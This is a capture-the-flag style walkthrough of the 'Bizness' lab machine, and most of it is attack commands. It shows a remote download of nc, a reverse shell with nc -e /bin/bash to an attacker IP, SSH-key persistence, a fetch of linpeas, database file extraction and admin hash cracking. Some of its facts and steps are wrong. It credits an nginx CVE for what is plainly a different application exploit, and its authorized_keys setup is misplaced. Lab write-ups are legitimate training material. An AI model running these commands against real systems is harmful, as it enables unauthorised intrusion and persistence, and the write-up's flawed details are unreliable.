# Bizness S4 Machine

## Initial Nmap Scan

```
sudo nmap -p- --min-rate 10000 IP | cut -d"/" -f1 | tr '\n' ','
Results: 22, 80, 443, 42275
```

```
sudo nmap -sCV -p22,80,443,42275 -oA tcp_ports 10.129.177.4
```
# Results:
    22/tcp: Open, SSH (OpenSSH 8.4p1 Debian 5+deb11u3)
    80/tcp: Open, HTTP (nginx 1.18.0)
    443/tcp: Open, SSL/HTTP (nginx 1.18.0)
    42275/tcp: Open, tcpwrapped
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    Domain Name
    `` # Add this to your hosts file
    Vulnerabilities
    Nginx 1.18.0 is vulnerable to CVE-2020-12440 (HTTP Request Smuggling) for both HTTP and HTTPS.
    
## Exploitation

```
sudo python3 exploit.py -u https://bizness.htb
```

### [1] Confirm vulnerability and proceed with exploitation.

## Exploitation Steps: 

Copy nc to the directory.

```
cp /usr/bin/nc ./
```

Start a Python server.

```
python3 -m http.server 80
```
Run the exploit script to install nc on the target.

```
python3 exploit.py --url https://bizness.htb --cmd "wget http://10.10.16.29/nc"
```

Start a listener.

```
nc -lvnp 1234
```

Execute nc on the target for a reverse shell.
```
python3 exploit.py --url https://bizness.htb --cmd "nc 10.10.16.29 1234 -e /bin/bash"
```
Upgrade the shell.

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Gain persistence by creating .ssh/authorized_keys.

```
cd /home/ofbiz/
mkdir .ssh
touch authorized_keys
```

Generate SSH keys on the local machine and copy the public key to the target.

```
ssh-keygen # Follow the prompts
Copy the public key to the target's .ssh/authorized_keys.
```

SSH into the target using the private key.

```
ssh -i id_rsa ofbiz@10.129.177.4
```

### [2]Enumeration

#### SUID Files

```
find / -type f -perm /4000 2>/dev/null
```

No interesting SUID files found.

#### Internal Ports

```
netstat -ano
No interesting internal ports found.
```
#### Automated Enumeration

Use linpeas.sh for automated enumeration.

```
cd /tmp
wget http://10.10.16.29/linpeas.sh
/bin/bash ./linpeas.sh
```
Save the output to a file for later reference.

```
bash ./linpeas.sh > linpease.txt
```
Transfer the file to the local machine using scp.

```
scp -i .ssh/id_rsa ofbiz@10.129.177.4:/tmp/linpease.txt ./
```

#### File Type Search
Search for interesting file types.

```
find / -type f -name '*.xml' 2>/dev/null
```
Locate a hash in an XML file.

#### Derby Database Exploration

Derby is an open-source RDBMS implemented in Java.
Investigate .dat files in the /opt/ofbiz/runtime/data/derby/ofbiztenant/seg0/ directory.
```
find / -type f -name '*.dat' 2>/dev/null
```
Copy all .dat files to a single .txt file and transfer it to the local host.

```
cat /opt/ofbiz/runtime/data/derby/ofbiztenant/seg0/* > dat_files.txt
```

Use strings to analyze the content of the file.
Cracking Password Hash
Locate a SHA-encrypted password for Admin.

```
strings dat_files.txt | grep SHA
```
Utilize information from the OFBiz GitHub repository to create a Python script for hash comparison.

### Python script in MySripts !

Successfully identify and crack the password.
With the cracked password, escalate privileges to root.
